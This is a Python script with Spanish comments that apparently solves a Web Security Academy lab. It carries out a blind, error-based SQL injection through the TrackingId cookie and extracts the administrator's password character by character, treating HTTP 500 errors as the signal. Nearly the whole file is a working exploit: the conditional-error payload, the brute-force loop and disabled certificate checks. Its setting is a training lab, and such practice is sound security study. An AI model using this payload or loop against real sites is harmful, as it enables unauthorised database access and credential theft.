import requests

#Para suprimir los mensajes de alerta en consola.
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = "https://0a3000d903945852806d12f80093000e.web-security-academy.net/"
session_cookie = "Wyt3wOXAim9nFBgNzMEzdUAgBQQwJO18"
tracking_id = "WcOVgSFzDbyjtX6G"
caracteres = "abcdefghijklmnopqrstuvwxyz0123456789"
password = ""

print("Iniciando extracción de contraseña...")

for posicion in range(1, 21):
    for caracter in caracteres:
        payload = f"{tracking_id}' ||(SELECT CASE WHEN (SUBSTR(password,{posicion},1)='{caracter}') THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
        cookies = {
            "TrackingId": payload,
            "session": session_cookie
        }
        response = requests.get(url, cookies=cookies, verify=False)
        if response.status_code == 500:
            password += caracter
            print(f"Posicion {posicion}: '{caracter}' → {password}")
            break

print(f"\nContraseña completa: {password}")
